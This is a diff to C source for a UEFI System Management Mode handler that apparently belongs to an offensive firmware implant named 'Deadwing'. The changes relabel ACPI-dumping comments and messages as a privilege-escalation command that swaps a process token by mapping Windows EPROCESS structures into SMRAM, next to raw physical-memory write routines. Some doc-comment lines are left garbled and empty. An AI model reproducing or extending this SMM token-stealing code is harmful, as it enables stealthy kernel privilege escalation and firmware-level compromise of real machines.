@@ -119,7 +119,7 @@ CmdPhysWrite(
 		return EFI_INVALID_PARAMETER;
 	}
 
-	// allocate intermediate page for storing data from read address
+	// allocate intermediate page for storing data from donor buffer
 	EFI_PHYSICAL_ADDRESS InterimPage;
 	EFI_STATUS Status = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &InterimPage);
 	if(EFI_ERROR(Status)) {
@@ -442,15 +442,14 @@ CmdVirtToPhys(
 }
 
 /**
- * \brief Dumps content of specific ACPI table
+ * \brief Changes controller process token
  * 
- * \param Signature     Signature of specific ACPI table
- * \param BufferAddress Output buffer
+ * \
+ * \
  * 
  * \return EFI_SUCCESS - Operation was performed succesfully
  * \return EFI_INVALID_PARAMETER - One or more arguments are invalid
- * \return EFI_ABORTED - Unable to translate and map virtual address to physical
- * \return EFI_ABORTED - Unable to find ACPI table or its length more than 4KB
+ * \return EFI_ABORTED - Unable to map system or controller EPROCESS into SMRAM
  */
 EFI_STATUS
 EFIAPI
@@ -519,7 +518,7 @@ CmdMainHandler(
 		case CMD_DEADWING_PRIV_ESC:
 			Status = CmdEscalatePrivileges();
 			if(EFI_ERROR(Status))
-				SerialPrint("[ SMM ] Unable to dump ACPI table\r\n");
+				SerialPrint("[ SMM ] Unable to leverage privileges\r\n");
 		break;
 		default:
 			// handler received unknown command, skip it
